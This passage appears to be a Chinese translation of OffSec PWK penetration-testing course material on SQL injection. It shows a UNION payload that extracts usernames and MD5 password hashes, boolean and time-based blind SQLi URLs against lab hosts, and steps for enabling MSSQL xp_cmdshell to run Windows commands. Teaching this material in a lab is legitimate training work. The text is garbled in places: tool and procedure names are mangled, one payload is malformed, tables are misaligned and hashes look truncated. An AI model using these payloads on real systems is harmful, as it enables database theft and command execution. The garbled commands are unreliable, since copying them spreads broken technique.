
# 使用 Kali Linux 进行渗透测试

*列表 199 - 获取当前数据库的表和列*

运行枚举尝试得到如下输出：

⁴⁶¹ (Oracle, 2022), https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html

PWK - Copyright ©2023 OffSec Services Limited. 保留所有。

| 名称 | 电话 | 地址 | 国家 | |
|---|---|---|---|---|
| customers | id | offsec | |
| customers | name | offsec | |
| customers | phone | offsec | |
| customers | address | offsec | |
| customers | country | offsec | |
| users | id | offsec | |
| users | username | offsec | |
| users | password | offsec | |
| users | description | offsec | |

插图 159: 导出当前数据库表结构

这证实了三列分别包含表名、列名和当前数据库。

有趣的是，我们发现了一个名为 `users` 的新表，它包含四列，其中一列名为 `password`。

让我们构建一个新查询来获取 users 表。

```
UNION select username, password, description, null FROM users -- //
```

*列表 200: 获取数据库表和列*

使用上述语句，我们将再次尝试在 Web 应用中存储用户名和描述的输出。

| 名称 | 电话 | 地址 | 国家 |
|---|---|---|---|
| admin | | 212329f27a5a54738940e4a801fc3 this is the |
| offsec | | 6664a1803311b35f81d0d7c8e02bd |
| boba | | 54dc23b5aa765d618327deb82cf99 |
| han | | 563c6b1f518252a6335616c94852acb | |

插图 160: 导出用户

太棒了！我们基于 UNION 的负载用于获取用户的用户名和 MD5 哈希值，包括管理员账户。这些值是明文密码的加密版本，可以使用相应的工具进行反转。

## 10.2.3 盲注

我们遇到的带内（in-band）SQL 负载意味着我们能够从 Web 应用中检索数据库内容。或者，盲注 SQL 通过数据库返回的响应，使用布尔或时间逻辑来推断场景。462 (Wikipedia, 2022), https://en.wikipedia.org/wiki/MD5

PWK - Copyright ©2023 OffSec Services Limited. 保留所有。

例如，通用的布尔 SQL 注入会导致应用程序在查询“boolean”名称时返回不同的值。这些值可以在应用上下文中进行审查。尽管布尔型可能不像 SQL 变体，但时间型的 SQL 注入通过指示数据库等待指定的时间来推断查询。根据响应，攻击者能够判断语句是 TRUE 还是 FALSE。我们的漏洞应用程序 (`http://192.168.50.16/blindsqli`) 受两种类型盲注的影响。一旦我们使用 `offsec` 凭据登录，将遇到以下页面：![](img/336d6ea891e7464f18ad64426619ced4_304.png)

| 盲注 SQL |
|---|---|
| 用户名: offsec | |
| 密码哈希: f964ea1803311b35f81d07c8e02bd | |
| 描述: try harder Profile |

插图 161: 测试 SQL

仔细查看 URL，我们会注意到应用程序接受 `user` 参数，默认 `offsec` 是我们登录的用户。应用程序查询用户记录，返回用户名、密码哈希和描述。为了测试布尔 SQLi，我们可以尝试将以下负载注入 URL：

```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 --
```

## 列表 201 - 测试布尔 SQLi

由于 `1=1` 为 TRUE，只有当用户存在于数据库时应用程序才会返回。使用此语法可以枚举整个数据库的其他用户名，甚至扩展我们的 SQL 查询以验证其他表的数据。我们可以使用时间型的 SQL 查询实现相同的结果：

```
http://192.168.50.16/blindsqli.php?user=offsec AND IF (i=1,sleep(3')) //
```

*列表 202 - 测试时间型 SQLi*

在这种情况下，我们在语句内部添加了 IF 条件，但如果用户不存在则返回 false。我们知道用户 `offsec` 是激活的，所以如果在 Kali VM 的浏览器中粘贴 URL 负载，我们会注意到应用程序挂起了大约三秒。这种攻击显然非常耗时，因此通常使用 `sqlmap` 等工具进行自动化，正如我们在下一个单元中涵盖的。

## 10.3 手动和自动代码执行

本单元涵盖以下目标：
- 使用 `xp_cmdshell` 利用 MSSQL 数据库
- 使用 SQLMap 自动化 SQL 注入

根据操作系统、服务权限和文件权限，SQL 注入漏洞可用于在操作系统上读写文件。精心制作的 PHP 代码写入 Web 服务器的根目录可以用于完全的代码执行。

### 10.3.1 手动代码执行

根据我们的目标数据库系统，我们需要调整策略以代码执行。在 Microsoft SQL Server 中，`xp_cmdshell` 函数接收字符串并将其传递给 shell 执行。该函数将任何输出作为文本行返回。该函数默认禁用，启用后必须在 SELECT 中使用 EXECUTE 关键字调用。

在我们的数据库中，Administrator 具有相应权限。让我们通过 `packet-mssql` 工具模拟 SQL 注入来探索 `xp_cmdshell`。

```
kali@kali:$packet-mssql Administrator:Lab123@192.168.50.18 -windows-auth

Impactbox v0.94 - Copyright 2022 SecureAuth Corporation

SQL> EXECUTE sp_config 'show advanced options', 1;

[*] INFO (SQL01)(SQLPRESS) Line 18: 配置选项'show advanced options' 从0变为1。运行 RECONFIGURE 语句进行安装。
```

463 (Microsoft, 2022), https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/system-stored-procedures/xp-cmdshell-transaction?view=sql-server-ver15

PWK - Copyright ©2023 OffSec Services Limited. 保留所有。

```
SQL> RECONFIGURE;

SQL> EXECUTE sp_configuration 'xp_cmdshell'; Configuration 'xp_cmdshell' changed from

[*] INFO(SQL01):SQLPRESS): Line 185: 配置选项'xp_cmdshell' 从0变为1。运行 RECONFIGURE。

SQL> RECONFIGURE;
```

*列表 203 - 启用 xp_cmdshell 功能*

在登录我们的 Kali VM 上的 MSSQL 实例后，我们可以通过将其值设置为 1 来启用高级选项，然后通过 RECONFIGURE 应用更改。有了此功能，我们可以通过 EXECUTE 语句后跟名称执行任何 Windows 命令。

```sql
SQL> EXECUTE xp_cmdshell 'whoami';

output
```
